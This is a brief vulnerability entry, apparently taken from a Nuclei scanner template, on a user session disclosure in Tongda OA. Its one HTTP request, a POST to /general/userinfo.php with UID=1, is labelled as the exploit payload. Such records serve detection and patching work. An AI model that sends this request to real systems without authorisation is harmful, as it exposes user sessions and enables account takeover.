# Vulnerability: Tongda User Session Disclosure
**Classification:** TONGDA
**Source:** Nuclei Template (`tongda-session-disclosure.yaml`)

## Description
Tongda User session exposed.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{BaseURL}}/general/userinfo.php?UID=1
```

